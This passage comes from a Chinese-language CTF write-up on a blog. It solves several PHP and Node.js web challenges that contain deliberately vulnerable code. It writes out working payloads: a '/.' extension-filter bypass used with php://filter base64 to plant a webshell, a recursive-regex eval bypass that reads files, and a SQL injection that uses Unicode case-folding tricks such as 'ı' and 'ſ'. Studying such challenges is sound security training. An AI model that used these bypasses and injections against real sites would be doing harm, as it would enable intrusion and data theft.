class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) {</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">}</span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) {</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">}</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//代码段2：</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) {</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>$domain那里用了<code>escapeshellarg()</code>，命令注入这条走不通。</p><p>文件内容我们可控，但是$output被<code>htmlspecialchars</code>转化为html实体，&lt;&gt;被干掉了，直接写shell不行，而且后缀限制得要死。</p><p>翻了以前的笔记：php在做路径处理的时候，会递归的删除掉路径中存在的“/.”。<a href="http://wonderkun.cc/index.html/?p=626" title="详情看这里" target="_blank" rel="noopener">详情看这里</a>，所以我们只要在后缀后面加上/. pathifo就取不到后缀名了，并且我们可以正常上传一个php文件。<br>那么后缀限制就可以绕过了，写文件我们可以用伪协议流</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180507-e69ed62c-0050-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180514-ea606424-0050-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>但是$log_name前面被加上了<code>$_SERVER['SERVER_NAME']</code>，查看了手册之后发现这个值我们是可控的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180528-f2fd4af2-0050-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>在本地尝试了一波，发现这个值是取http响应头的host值。</p><p>最后一个问题是我们怎么控制base64的长度呢，我们知道base64编码之后一定是4的倍数，解码也是按4位4位来解的，那么我们只要控制好$output的值使得我们shell可以正常解码就可以了</p><p>还有一个trick：就是php在进行base64解码的时候如果遇到不是base64编码的字符会直接跳过</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180618-107d17ce-0051-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>发现我们是可以正常解码的。<br>然后我们再判断我们shell前面符合base64编码有多少就可以了，不够可以填充，不过刚好是符合4的倍数，无需填充</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180706-2d128720-0051-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>思路都ok了，那么我们就写shell吧<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180801-4e69462a-0051-1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>可以成功上传<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180825-5c5603c2-0051-1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><br>getflag<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180900-7132ab38-0051-1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h1 id="4-easy-phplimit"><a href="#4-easy-phplimit" class="headerlink" title="4.easy - phplimit"></a>4.easy - phplimit</h1><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) {    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里涉及到了PHP正则表达式的递归模式，不清楚什么是递归模式可以看这里 <a href="http://php.net/manual/zh/regexp.reference.recursive.php" title="http://php.net/manual/zh/regexp.reference.recursive.php" target="_blank" rel="noopener">http://php.net/manual/zh/regexp.reference.recursive.php</a>，</p><p>题目中的正则表达式中的关键点是<code>(?R)?</code>，<code>(?R)</code>的作用就是递归地替换它所在的整条正则表达式. 在每次迭代时, PHP语法分析器都会将<code>(?R)</code>替换为 <code>'/[^\W]+\((?R)?\)/'</code>。</p><p>那么上面真正表达式就一目了然了，就是传入的必须是函数，而且这个函数不能带入参数，类似于这种：func1(func2(func3()))，递归模式会一直递归匹配括号的内容下去。</p><p>正则知道怎么走了，那么现在就用PHP不带参数的函数一把梭吧，在本地用了N个函数测试，最终payload：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=var_dump(file_get_contents(next(array_reverse(scandir(dirname(chdir(next(scandir(getcwd())))))))));</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181715-98893016-0052-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>还有另一种解法是利用：<code>get_defined_vars()</code><br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181306-04007e40-0052-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>那么我们可以再提交一个参数过去，再用<code>get_defined_vars()</code>函数去获取</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181731-a1c399be-0052-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="5-easy-nodechr"><a href="#5-easy-nodechr" class="headerlink" title="5.easy - nodechr"></a>5.easy - nodechr</h1><p>代码太长了，这里就贴出关键代码吧<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键代码1：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>{</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) {</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">//关键代码2：</span></span><br><span class="line"><span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line"><span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line"><span class="keyword">if</span> (username &amp;&amp; password) {</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">${username.toUpperCase()}</span>' AND "password" = '<span class="subst">${password.toUpperCase()}</span>'`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) {</span><br><span class="line">        ctx.session.user = user</span><br><span class="line"></span><br><span class="line">        jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>很明显的sql注入，但是union，select被ban了，看着toUpperCase()这个很是诡异，再加上ph师傅给的tips，百度之，然后就百度到了ph师傅<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a><br>要点如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215191314-6a367202-005a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>那么思路很清晰了，unıon.toUpperCase()==UNION，ſelect.toUpperCase()==SELECT</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215191754-11386b46-005b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>接下来就是简单的注入了<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1%27 un%C4%B1on %C5%BFelect null,(%C5%BFelect flag from flags),'null</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215194640-16261d0c-005f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215194703-23cd9624-005f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>这几道题目考察很多有意思的东西，也感谢ph师傅出这几道很Nice的题目，涨了不少姿势。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
